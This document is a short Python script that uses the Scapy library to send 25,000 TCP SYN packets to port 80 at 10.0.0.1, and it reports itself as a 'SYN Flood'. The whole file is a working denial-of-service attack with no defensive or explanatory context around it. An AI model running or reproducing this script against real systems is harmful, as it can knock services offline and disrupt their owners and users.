from scapy.all import *

target_ip = "10.0.0.1"
target_port = 80
num_packets = 25000

print(f"Sending {num_packets} SYN packets to {target_ip}")

send(IP(dst=target_ip)/TCP(sport=RandShort(), dport=target_port, flags="S"),
     count=num_packets, inter=0, verbose=0)

print("SYN Flood finished.")
